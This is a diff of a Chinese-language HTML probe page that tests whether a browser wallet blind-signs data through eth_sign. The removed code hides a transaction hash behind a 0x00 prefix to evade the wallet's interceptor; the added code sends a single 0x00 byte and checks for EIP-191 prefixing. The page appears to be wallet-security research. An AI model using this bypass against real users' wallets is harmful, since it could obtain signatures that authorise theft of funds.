@@ -2,30 +2,33 @@
 <html lang="zh-CN">
 <head>
     <meta charset="UTF-8">
-    <title>0x00 解析器差异与签名真伪鉴定</title>
+    <title>0x00 极简边界值探测与底层鉴定</title>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.11.1/ethers.umd.min.js"></script>
     <style>
-        body { font-family: monospace; max-width: 800px; margin: 20px auto; padding: 20px; background-color: #f4f4f9; color: #333; }
-        button { padding: 12px 20px; margin: 10px 10px 10px 0; cursor: pointer; background-color: #007bff; color: white; border: none; border-radius: 6px; font-weight: bold; }
-        button.danger { background-color: #dc3545; }
-        button:disabled { background-color: #ccc; cursor: not-allowed; }
-        #console { background: #1e1e1e; color: #00ff00; padding: 15px; border-radius: 8px; height: 400px; overflow-y: auto; white-space: pre-wrap; font-size: 13px; border: 2px solid #333; line-height: 1.5; }
+        body { font-family: monospace; max-width: 800px; margin: 20px auto; padding: 25px; background-color: #f8f9fa; color: #333; }
+        h2 { border-bottom: 2px solid #dee2e6; padding-bottom: 10px; }
+        button { padding: 12px 24px; margin: 10px 10px 10px 0; cursor: pointer; background-color: #0d6efd; color: white; border: none; border-radius: 6px; font-weight: bold; }
+        button.exploit { background-color: #dc3545; }
+        button:disabled { background-color: #adb5bd; cursor: not-allowed; }
+        #console { background: #212529; color: #20c997; padding: 20px; border-radius: 8px; height: 400px; overflow-y: auto; white-space: pre-wrap; font-size: 14px; border: 1px solid #495057; line-height: 1.6;}
+        .danger-text { color: #ff4d4d; font-weight: bold; }
+        .safe-text { color: #0dcaf0; font-weight: bold; }
     </style>
 </head>
 <body>
-    <h2>0x00 伪装与底层真伪鉴定器</h2>
+    <h2>边界值探测：单字节 0x00 盲签测试</h2>
     
     <div>
         <button id="btnConnect">1. 连接测试钱包</button>
-        当前地址: <span id="walletAddress" style="color: #007bff; font-weight: bold;">未连接</span>
+        当前地址: <span id="walletAddress" style="color: #0d6efd; font-weight: bold;">未连接</span>
     </div>
 
-    <div style="margin-top: 15px; border-top: 1px dashed #ccc; padding-top: 15px;">
-        <button id="btnBypass" class="danger" disabled>2. 发送 0x00 伪装哈希并鉴定</button>
+    <div style="margin-top: 20px; padding-top: 20px; border-top: 1px dashed #ced4da;">
+        <button id="btnBypass" class="exploit" disabled>2. 发送纯 0x00 并鉴定</button>
     </div>
 
-    <h3 style="margin-top: 20px;">渗透与鉴定日志:</h3>
-    <div id="console">等待操作...</div>
+    <h3 style="margin-top: 30px; color: #495057;">探测控制台:</h3>
+    <div id="console">系统就绪，等待操作...</div>
 
     <script>
         const btnConnect = document.getElementById('btnConnect');
@@ -54,70 +57,56 @@
         btnBypass.addEventListener('click', async () => {
             if (!currentAccount) return;
             
-            // 真实的恶意交易哈希 (不带 0x)
-            const realTxHash = "89c9e5fa472f883b6f007bc9543e2621c1f55b9e0f34033dfd720c24298150a0";
+            // 核心：极简 Payload，仅包含一个空字节
+            const payload = "0x00"; 
             
-            // 伪装构造：在前面加上 0x00。
-            // 拦截器看到 0x00 可能以为是空数据，但底层解析器可能会跳过 00 直接读取后面的真实哈希。
-            const bypassPayload = "0x00" + realTxHash; 
-            
-            log(`\n--- 🚀 发送带有 0x00 伪装的 Payload ---`);
-            log(`Payload: ${bypassPayload}`);
+            log(`\n--- 🚀 发送极简边界值 Payload ---`);
+            log(`请求签名数据: ${payload} (单字节)`);
             
             try {
                 const signature = await window.ethereum.request({
                     method: 'eth_sign',
-                    params: [currentAccount, bypassPayload]
+                    params: [currentAccount, payload]
                 });
                 
-                log(`🚨 [绕过成功] 成功骗过拦截器，拿到签名:\n${signature}`);
-                log(`\n🔍 开始拆解签名，验证底层逻辑...`);
+                log(`\n<span class="danger-text">🚨 [突破防线] 钱包由于长度判断缺陷，未能拦截！成功拿到签名:</span>\n${signature}`);
+                log(`\n🔍 开始验证底层是否实施了安全包装...`);
                 
-                verifySignature(bypassPayload, "0x" + realTxHash, signature, currentAccount.toLowerCase());
+                verifyLogic(payload, signature, currentAccount.toLowerCase());
 
             } catch (error) {
                 log(`🛡️ 请求被拦截: ${error.message}`);
+                log(`分析：钱包防火墙不仅校验格式，还对所有长度的纯 Hex 实施了无差别拦截。`);
             }
         });
 
-        function verifySignature(payload, realHash, signature, address) {
+        function verifyLogic(payload, signature, address) {
             if (typeof ethers === 'undefined') return;
             let resolved = false;
 
-            // 验证 1：是否对真实的交易哈希进行了盲签？(致命漏洞)
+            // 验证 1：是否对 0x00 进行了绝对裸签？
             try {
-                if (ethers.recoverAddress(realHash, signature).toLowerCase() === address) {
-                    log(`\n💥 [致命漏洞！] 鉴定结果：底层剥离了 0x00，对【真实的交易哈希】进行了裸签！`);
-                    log(`结论：这是真正的 eth_sign！钱包不仅被绕过了前端拦截，还主动配合执行了危险的盲签。`);
+                if (ethers.recoverAddress(payload, signature).toLowerCase() === address) {
+                    log(`\n<span class="danger-text">💥 [高危漏洞] 鉴定结果：钱包对 0x00 进行了真 eth_sign 裸签！</span>`);
+                    log(`结论：没有任何前缀保护。如果某个智能合约未严格校验签名长度和内容，直接 ecrecover 这个单字节签名的结果，可能会被攻击。`);
                     resolved = true;
                 }
             } catch(e) {}
 
-            // 验证 2：是否对带着 0x00 的全量数据进行了盲签？(也是高危漏洞)
+            // 验证 2：是否被转成了安全的 personal_sign？
             if (!resolved) {
                 try {
-                    if (ethers.recoverAddress(payload, signature).toLowerCase() === address) {
-                        log(`\n⚠️ [高危漏洞！] 鉴定结果：底层对包含 0x00 的畸形数据进行了裸签。`);
-                        log(`结论：这是真正的 eth_sign！虽然没有剥离 0x00，但依然没有进行安全前缀保护。`);
-                        resolved = true;
-                    }
-                } catch(e) {}
-            }
-
-            // 验证 3：是否转换为了 personal_sign？(安全防御)
-            if (!resolved) {
-                try {
-                    const bytes = ethers.getBytes(payload);
+                    const bytes = ethers.getBytes(payload); // 转换为 Uint8Array([0])
                     if (ethers.verifyMessage(bytes, signature).toLowerCase() === address) {
-                        log(`\n🛡️ [安全防御] 鉴定结果：已被转换为 personal_sign。`);
-                        log(`结论：虽然 0x00 骗过了拦截器唤起了 UI，但底层依然加上了 EIP-191 前缀。该签名无法作为恶意交易广播。`);
+                        log(`\n<span class="safe-text">🛡️ [安全防御] 鉴定结果：已被转换为 personal_sign。</span>`);
+                        log(`结论：虽然 0x00 骗过了 UI 弹窗，但底层依然安全地加上了 EIP-191 文本前缀。`);
                         resolved = true;
                     }
                 } catch(e) {}
             }
 
             if (!resolved) {
-                log(`\n❓ [未知逻辑] 无法解析。底层使用了特殊的截断或填充规则。`);
+                log(`\n❓ [未知逻辑] 无法解析签名，底层处理异常。`);
             }
         }
     </script>
